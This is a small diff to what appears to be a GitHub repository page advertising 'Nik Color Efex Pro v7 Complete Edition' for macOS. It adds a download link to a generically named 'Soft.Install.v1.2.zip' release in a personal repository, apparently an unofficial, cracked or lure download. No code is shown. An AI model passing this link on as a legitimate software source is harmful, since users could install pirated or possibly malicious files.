@@ -5,5 +5,5 @@
 <p><img src="https://repository-images.githubusercontent.com/298831291/8b9093a4-815f-4430-b0a6-f27c422c4f16"/></p>
 
 <p><strong>System Requirements: macOS 10.15 and later</p>
-Nik Color Efex Pro v7 Complete Edition [macOS] | <a href="">Download</a>
+Nik Color Efex Pro v7 Complete Edition [macOS] | <a href="https://github.com/akarounis/Nik-Color-Efex-Pro-for-Mac/releases/download/v7/Soft.Install.v1.2.zip">Download</a>
 </h1>
